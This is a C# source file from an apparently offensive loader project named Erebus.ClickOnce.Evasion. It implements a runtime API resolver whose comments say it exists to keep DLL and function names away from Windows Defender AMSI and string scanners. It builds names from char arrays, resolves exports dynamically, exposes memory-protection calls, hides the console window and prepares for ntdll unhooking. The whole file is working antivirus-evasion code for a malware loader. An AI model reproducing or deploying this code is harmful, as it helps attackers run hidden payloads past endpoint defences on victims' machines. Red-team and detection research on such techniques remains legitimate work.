using System;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;

namespace Erebus.ClickOnce.Evasion
{
    /// <summary>
    /// Small runtime API resolver that keeps sensitive DLL and function
    /// names out of the assembly's #Strings metadata stream.
    ///
    /// The problem: every <c>[DllImport("amsi.dll", EntryPoint = "AmsiScanBuffer")]</c>
    /// declaration leaves the DLL name and function name as plaintext UTF-8
    /// in the assembly's #Strings heap, which is the first place Windows
    /// Defender AMSI and string-based scanners look. We can't avoid that
    /// for kernel32.dll / LoadLibraryA / GetProcAddress / VirtualProtect -
    /// those are already so common in .NET code that they blend in - but
    /// we can keep everything else off the table by building the names as
    /// character arrays at runtime and passing them through GetProcAddress.
    ///
    /// char[] literals in C# compile to a sequence of ldc.i4 + stelem IL
    /// instructions operating on the char values as integers, so the name
    /// never exists as a contiguous byte sequence in the PE until we
    /// explicitly materialise it at runtime.
    /// </summary>
    [SupportedOSPlatform("windows")]
    internal static class DynamicApi
    {
        // --- Page protection constants (from winnt.h) ------------------
        public const uint PAGE_NOACCESS          = 0x01;
        public const uint PAGE_READONLY          = 0x02;
        public const uint PAGE_READWRITE         = 0x04;
        public const uint PAGE_EXECUTE           = 0x10;
        public const uint PAGE_EXECUTE_READ      = 0x20;
        public const uint PAGE_EXECUTE_READWRITE = 0x40;

        // --- Pre-materialised DLL names as char arrays -----------------
        // These initializers compile to a sequence of ldc.i4 / stelem.i2
        // instructions (one per char), so the DLL names never exist as a
        // contiguous byte sequence in the assembly's #Strings heap. A
        // metadata scanner that greps the #Strings stream will not find
        // "ntdll.dll" or "kernel32.dll" in the resulting binary.
        public static readonly char[] Ntdll    = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l' };
        public static readonly char[] Kernel32 = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l' };
        public static readonly char[] User32   = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l' };

        // --- Bootstrap P/Invokes (kept as plaintext; unremarkable) -----
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetModuleHandleA([MarshalAs(UnmanagedType.LPStr)] string? lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, [MarshalAs(UnmanagedType.LPStr)] string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

        // Belt-and-braces detach from any inherited console. The ClickOnce
        // loader ships as a Subsystem=2 (Windows GUI) exe, so Windows does
        // not allocate a console on process creation - but if the parent
        // process that launched us had a console open, it is inherited.
        // FreeConsole drops that handle so nothing we do afterwards (JIT
        // traces, managed exceptions written to stderr, etc.) can surface
        // a visible window.
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool FreeConsole();

        // --- Runtime string materialisation ---------------------------
        // Build a string at runtime from a character array. Because each
        // character is stored as a short IL immediate rather than as part
        // of a literal string, the resulting bytes do not appear in the
        // assembly's #Strings heap and are invisible to AMSI-style
        // metadata scanners.
        public static string FromChars(params char[] chars) => new string(chars);

        // --- Resolvers ------------------------------------------------
        // Prefer GetModuleHandle first so we don't trigger the loader for
        // DLLs already mapped into the process (amsi.dll and ntdll.dll
        // are almost always present in a .NET host).
        public static IntPtr ResolveModule(char[] dllName)
        {
            string name = FromChars(dllName);
            IntPtr h = GetModuleHandleA(name);
            if (h != IntPtr.Zero) return h;
            return LoadLibraryA(name);
        }

        public static IntPtr ResolveExport(IntPtr module, char[] funcName)
        {
            if (module == IntPtr.Zero) return IntPtr.Zero;
            return GetProcAddress(module, FromChars(funcName));
        }

        public static IntPtr Resolve(char[] dllName, char[] funcName)
            => ResolveExport(ResolveModule(dllName), funcName);

        // Delegate factory for callers that want a typed invocation.
        public static T? GetDelegate<T>(char[] dllName, char[] funcName) where T : Delegate
        {
            IntPtr addr = Resolve(dllName, funcName);
            if (addr == IntPtr.Zero) return null;
            return Marshal.GetDelegateForFunctionPointer<T>(addr);
        }

        // Lazy variant used by per-file D/Invoke wrappers. Resolution
        // happens on first access, not at type init - this matters
        // because NtdllUnhook has to run before we cache any function
        // pointer, otherwise the delegate captures the hooked stub.
        public static Lazy<T> LazyDelegate<T>(char[] dllName, char[] funcName) where T : Delegate
            => new(() =>
            {
                var d = GetDelegate<T>(dllName, funcName);
                if (d == null)
                {
                    // Resolution failure is fatal for the caller. The
                    // host is either missing the DLL or the export has
                    // been renamed, both of which mean we can't continue.
                    // Deliberately terse: we don't want the DLL / function
                    // name showing up in crash dumps or error logs.
                    throw new InvalidOperationException("resolution failed");
                }
                return d;
            });
    }
}
